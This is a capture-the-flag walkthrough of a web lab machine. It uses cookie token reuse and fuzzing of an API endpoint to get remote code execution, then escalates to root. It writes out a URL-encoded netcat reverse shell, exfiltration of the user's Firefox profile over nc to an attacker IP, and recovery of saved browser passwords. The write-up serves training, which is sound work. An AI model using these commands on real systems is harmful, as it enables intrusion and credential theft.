First, I start by scanning the network to identify which ports are accessible and open 

<img width="922" height="387" alt="image" src="https://github.com/user-attachments/assets/3b3e9a16-7049-4b42-a79f-d8cbe2545659" />

We only have port 80 (web) open 

If we look at the page's source code, we can see an API call

<img width="636" height="521" alt="image" src="https://github.com/user-attachments/assets/3dc887a8-6832-4862-9b63-0d660b97b854" />

and when we try it in the URL, we find the first token

<img width="509" height="167" alt="image" src="https://github.com/user-attachments/assets/b484077a-1538-4af2-9ef1-535f6f528112" />

I entered the token into [cyberChef](https://gchq.github.io/CyberChef/) which allowed me to decode it easily thanks to the “magic” option

<img width="1537" height="936" alt="image" src="https://github.com/user-attachments/assets/845941dd-0f1d-4416-b83f-657122117a60" />

Using the same source code, I was able to retrieve the image’s location, so I’m downloading it to check whether it contains any metadata or other sensitive data. 

<img width="1158" height="138" alt="image" src="https://github.com/user-attachments/assets/f6089424-9f3d-4a38-a482-5ad70179b688" />

It contains no metadata 

<img width="808" height="144" alt="image" src="https://github.com/user-attachments/assets/3b369e7c-5199-41c1-8cd5-38847f11f433" />

that's not it

I was on the right track at first; all I had to do was use the token I retrieved and decrypted at the beginning and put it in the cookie in the site's storage.

<img width="377" height="413" alt="image" src="https://github.com/user-attachments/assets/c032a664-97b7-4357-9a4d-ba647ebc1a1d" />

and the page will become something else 

<img width="1248" height="1252" alt="image" src="https://github.com/user-attachments/assets/a76a4b48-4912-4e4f-926b-f61c9e2b9589" />

and the page will become something else With the new view, there have been new API calls made on the front end, notably this one: `/api/items`.
This API call is not properly secured and accepts POST requests without verification. 

First, I try out a few different options to see what this route has in store 

`{"cmd": "id"}
{"exec": "id"}
{"command": "id"}
{"v": "id"}
{"input": "id"}`

<img width="1098" height="944" alt="image" src="https://github.com/user-attachments/assets/c2165231-8857-4207-890c-8666cb319abc" />

but everything returns an error code `400 Bad Request`

I used wfuzz to try something out, and bingo! 

`wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/api/objects.txt -X POST --hc 404,400 [http://glitch.thm/api/items\?FUZZ\=test](http://glitch.thm/api/items/?FUZZ\=test)` 

<img width="1128" height="426" alt="image" src="https://github.com/user-attachments/assets/0c872fcc-2b6e-4a43-8887-49eb8dc2b912" />

There is indeed an RCE

To use it, I create a shell using `nc mkfifo` with URL encoding
`rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.129.16%204444%20%3E%2Ftmp%2Ff` 

Once I was in the shell, I ran a `find` command to locate the `user.txt` file

`find / -name user.txt` 

which gives us the following result:

`/home/user/user.txt` 

Next, we need to regain root access. To do this, we'll need to perform a privilege escalation.

So I did two things I should have done from the start: first, I checked what my role was with the order: 

`whaomi`

The second step is to run `ls -la ~`, which lets you see all the hidden files 

<img width="746" height="296" alt="image" src="https://github.com/user-attachments/assets/e28f4e72-b9e4-4c5f-a8cb-75bc84290931" />

The .firefox folder is interesting; let's download it to our computer. 

First, we're going to archive it 

`tar -cvf /tmp/firefox.tgz ~/.firefox` 

Next, I open a port on my computer so I can transfer the archive 

**`nc -lvnp 5555 > firefox.tgz`** 

and in the app's shell, I run this command to send it to myself 

`nc 192.168.129.16 5555 < /tmp/firefox.tgz` 

Once the file is downloaded, my `nc` command with the open port closes automatically 

<img width="916" height="138" alt="image" src="https://github.com/user-attachments/assets/564673cf-8955-4f2d-b774-800f8171aa36" />

Once the archive has been extracted on my computer:
`tar xvf /workspace/firefox.tgz -C /workspace/`

I launch Firefox using the restored profile:
`firefox --profile /workspace/home/user/.firefox/b5w4643p.default-release --allow-downgrade`

In Firefox, I go to `about:logins` and find the password for the user `v0id`

I go back to my shell and switch to `v0id`:
`su v0id`

Looking at the linPEAS output, we noticed an interesting line:
`permit v0id as root`

This means that `v0id` can execute commands as root via `doas`. So I use it to get a root shell:
`doas -u root /bin/bash`

It asks me for the `v0id` password that I retrieved from Firefox; I enter it, and now I'm root:
`whoamiroot`

All that's left to do is read the flag:
`cat /root/root.txt`
